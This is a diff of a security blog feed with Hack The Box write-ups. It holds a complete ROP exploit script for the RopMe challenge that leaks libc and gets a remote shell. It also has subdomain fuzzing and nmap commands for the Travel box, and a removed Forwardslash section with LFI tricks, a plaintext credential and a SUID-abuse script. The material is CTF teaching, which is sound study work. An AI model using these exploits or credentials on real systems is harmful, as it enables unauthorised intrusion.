+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;puts@@GLIBC&quot;&lt;/span&gt;
+   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+   404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;as well as the addresses of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;)&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;one_gadget libc.so.6
+0x45216 execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x30, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+constraints:
+  rax &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+
+0x4526a execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x30, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+constraints:
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x30] &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+
+0xf02a4 execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x50, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+constraints:
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x50] &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+
+0xf1147 execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x70, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+constraints:
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x70] &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With this we only need to calculate the base address of libc from the leak, add the address to the system call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; to it and send it together with 72 bytes of junk to get a shell:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/challenges/pwn/RopMe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python xpl.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Opening connection to docker.hackthebox.eu on port 31910: Done
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Leaked puts address: 0x7f7aa52fd690
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Switching to interactive mode
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;flag.txt
+ropme
+spawn.sh
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;redacted&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;appendix&quot;&gt;Appendix&lt;/h1&gt;
+&lt;h2 id=&quot;code&quot;&gt;Code&lt;/h2&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;docker.hackthebox.eu&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30948&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4004e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400626&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#p = process('./ropme')
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline_contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# calls main after 1st return
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Part one
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Leaked puts address: 0x%x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Part two
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6f690&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_puts&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc_sh&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45216&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# 0xf1147 # 0xf02a4 # 0x4526a
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stage_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stage_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;resources&quot;&gt;Resources&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=kUk5pw4w0h4&quot;&gt;LiveOverflow&lt;/a&gt; explaining PLT and GOT&lt;/li&gt;
+  &lt;li&gt;This &lt;a href=&quot;https://0xdf.gitlab.io/2019/10/19/htb-ellingson.html#overflow-protections&quot;&gt;write-up&lt;/a&gt; of the box &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt; from &lt;a href=&quot;https://app.hackthebox.eu/users/4935&quot;&gt;0xdf&lt;/a&gt; was very helpful to me.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Philipp Menner</name></author><category term="ROP" /><category term="pwn" /><summary type="html">Write-up of the challange pwn challenge RopMe from Hack The Box</summary></entry><entry><title type="html">HackTheBox - Travel</title><link href="http://localhost:4000/boxes/travel/" rel="alternate" type="text/html" title="HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>http://localhost:4000/boxes/travel</id><content type="html" xml:base="http://localhost:4000/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Travel&lt;/code&gt; is an interesting box created by &lt;a href=&quot;https://app.hackthebox.eu/users/77141&quot;&gt;jkr&lt;/a&gt; and his team member &lt;a href=&quot;https://app.hackthebox.eu/users/13569&quot;&gt;xct&lt;/a&gt;. It required some fuzzing and enumerating to get a foothold, exploiting memcached abusing a SSRF vulnerability and finally modifying users by taking advantage of our LDAP privileges.&lt;/p&gt;
 &lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
-&lt;p&gt;Since &lt;a href=&quot;#Nmap scan&quot;&gt;the nmap scan&lt;/a&gt; just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page mentions a blog, so scanning for subdomains is the next logical step:&lt;/p&gt;
+&lt;p&gt;Since &lt;a href=&quot;#Nmap scan&quot;&gt;the nmap scan&lt;/a&gt; just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page not only gives away the domain name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;travel.htb&lt;/code&gt; but also mentions a blog site, so scanning for subdomains is the next logical step:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--filter&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;l!=144&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://travel.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.travel.htb&quot;&lt;/span&gt;
 
 000000032:   200        345 L    1408 W   24462 Ch    &lt;span class=&quot;s2&quot;&gt;&quot;blog&quot;&lt;/span&gt;                         
@@ -15,6 +202,8 @@
   &lt;li&gt;Wordpress login at http://blog.travel.htb/wp-login.php&lt;/li&gt;
   &lt;li&gt;WP user registration not allowed&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;p&gt;but unfortunately none of these infos will be of use.&lt;/p&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;Also, from reading the source code of the landing page we find another subdomain called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog-dev.travel.htb/&lt;/code&gt; which we get a 403 forbidden when browsing to. However we can scan this subdomain either with gobuster or nmap to find out that there’s a git repository hidden:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/travel&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; 5 blog.travel.htb
@@ -1018,220 +1207,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 
 &lt;p&gt;&lt;a name=&quot;[2]&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/&quot;&gt;Another source of useful write-ups&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box PlayerTwo from Hack The Box</summary></entry><entry><title type="html">HackTheBox - Forwardslash</title><link href="http://localhost:4000/boxes/forwardslash/" rel="alternate" type="text/html" title="HackTheBox - Forwardslash" /><published>2020-06-26T21:33:36-04:00</published><updated>2020-06-26T21:33:36-04:00</updated><id>http://localhost:4000/boxes/forwardslash</id><content type="html" xml:base="http://localhost:4000/boxes/forwardslash/">&lt;p&gt;Fowardslash was a nice hard box where we had to find a hidden backup domain to gain remote access on the machine. The root part included bruteforcing a cipher, which revealed the key to mount an encrypted partition that contained a root ssh private key.&lt;/p&gt;
-
-&lt;h1 id=&quot;nmap-scans&quot;&gt;NMAP scans&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/bd99b3a0-788e-43b2-94f8-52b42aefaf4b/b7301415-1c0d-48ed-935f-33a38696cb52.png&quot; alt=&quot;b7301415-1c0d-48ed-935f-33a38696cb52.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Only port 80 open, must be interesting&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;basic-enumeration&quot;&gt;Basic enumeration&lt;/h1&gt;
-
-&lt;p&gt;The default page of the index.php:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/9312fb05-e8ed-42ed-86e1-6af3b67392fe/616af91c-4c09-4d56-9c3c-54acd44cbf77.png&quot; alt=&quot;616af91c-4c09-4d56-9c3c-54acd44cbf77.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Get get some hints that we might need to do an XXE or exploit an FTP server.&lt;/p&gt;
-
-&lt;p&gt;Continuing to fuzz, we get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/note.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/b4fcbd39-60dc-4e41-8f30-a89b628ca32d/b7b80b02-6e84-480c-b27e-7d4f6c0921f1.png&quot; alt=&quot;b7b80b02-6e84-480c-b27e-7d4f6c0921f1.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Probably the first user on the machine: chiv&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Using the backup hint, we add &lt;strong&gt;backup.forwardslash.htb&lt;/strong&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; to get that page or by bruteforcing possible VHOST names:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/c61716b3-9097-4202-9feb-a4768a7cf566/b092ef37-508b-4815-8376-d7b4cf6bfcad.png&quot; alt=&quot;b092ef37-508b-4815-8376-d7b4cf6bfcad.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We can either create a user or an already existing user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pain:password&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Bruteforcing the dirs we get the following pages:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DirBuster 1.0-RC1 - Report
-Report produced on Mon Apr 06 17:37:08 CEST 2020
-&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
-http://backup.forwardslash.htb:80
-&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
-Dirs found with a 403 response:
-/icons/
-/dev/
-/icons/small/
-/server-status/
-&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
-Files found with a 302 responce:
-/index.php
-/welcome.php
-/environment.php
-/logout.php
-/hof.php
-&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
-Files found with a 200 responce:
-/login.php
-/register.php
-/api.php
-/config.php
-&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
-Files found with a 403 responce:
-/dev/index.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Continuing to enumerate, I also found the profilepicture.php, which allows us to include an URL to change our profile picture.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/c61ccb92-2a51-4bd5-be06-911a9bbf2355/8c56bb66-16d0-49c4-86fe-b0966e6b700c.png&quot; alt=&quot;8c56bb66-16d0-49c4-86fe-b0966e6b700c.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Since it is only HTML disabled, we can go ahead and enable it using the inspector HTML inspector in the browser to then intercept the request. Here we can see what it looks like. It looks like the author of the box thought of this exploit, so we get a sneaky little message that it won’t work this way:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/ba84a697-128a-4ca5-b251-47e44a6746ae/c4721c46-0423-49c7-9093-33c931ce1847.png&quot; alt=&quot;c4721c46-0423-49c7-9093-33c931ce1847.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;At first I thought that we had to do some kind of XXE, as mentioned before, but it is way simpler to use PHP wrappers/filters to read the file. The &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion&quot;&gt;swisskyrepo/PayloadsAllTheThings&lt;/a&gt; repo has a great collection:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/a000439d-eb32-4a24-80f7-defe4fd477c6/638ffa93-d481-4d83-ad8a-3d484f7a0922.png&quot; alt=&quot;638ffa93-d481-4d83-ad8a-3d484f7a0922.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This way we can read the source code of api.php, where we can find some creds:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/a232553f-980d-4fc6-9fc8-a968455d2782/4b235659-62ff-47b4-9e2e-10f8d1e61761.png&quot; alt=&quot;4b235659-62ff-47b4-9e2e-10f8d1e61761.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Chiv:N0bodyL1kesBack&lt;/code&gt;/&lt;/p&gt;
-
-&lt;h1 id=&quot;getting-user-pain&quot;&gt;Getting user: pain&lt;/h1&gt;
-
-&lt;p&gt;SSH into the system and after some enumeration a binary has been found. It is called backup and can be executed by us and has the SUID bit set, therefore allowing us to execute it as the owner - pain.&lt;/p&gt;
-
-&lt;p&gt;Here’s what it does:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;It creates an MD5 Hash depending on the time&lt;/li&gt;
-  &lt;li&gt;The binary checks if a file has the same name as a hash at the created-time&lt;/li&gt;
-  &lt;li&gt;If correct, the contents of a file will be printed&lt;/li&gt;
-  &lt;li&gt;Creating a little python script, which looks like this, we can read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups/config.php.bak&lt;/code&gt;, which contains the creds of the user pain&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Using this little python script to read the contents:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;current_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%H:%M:%S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
